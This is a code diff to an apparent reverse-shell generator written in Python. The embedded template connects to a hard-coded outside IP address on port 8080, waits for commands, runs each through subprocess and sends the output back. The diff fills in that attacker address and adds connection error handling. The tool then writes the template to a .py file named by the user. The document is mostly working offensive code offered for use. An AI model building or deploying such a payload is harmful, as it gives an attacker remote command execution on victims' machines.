@@ -72,12 +72,22 @@ import subprocess
 import os
 import sys
 
-REMOTE_HOST = '' # Change
+REMOTE_HOST = '191.177.122.163' # Change
 REMOTE_PORT = 8080
 client = socket.socket()
 print("[-] Connection Initiating...")
-client.connect((REMOTE_HOST, REMOTE_PORT))
-print("[-] Connection initiated!")
+try:
+    client.connect((REMOTE_HOST, REMOTE_PORT))
+    print("[-] Connection initiated!")
+except TimeoutError:
+    os.system("clear")
+    print("[!] Connection refused")
+    sys.exit()
+
+except KeyboardInterrupt:
+    os.system("clear")
+    print("[!] Shutdown")
+    sys.exit()
 
 while True:
     print("[-] Awaiting commands...")
@@ -88,7 +98,7 @@ while True:
     output_error = op.stderr.read()
     print("[-] Sending response...")
     client.send(output + output_error)
-"""
+    """
 banner()
 file_name = input("[!] Insert a file name.py: ")
 arq = open(file_name, 'w')
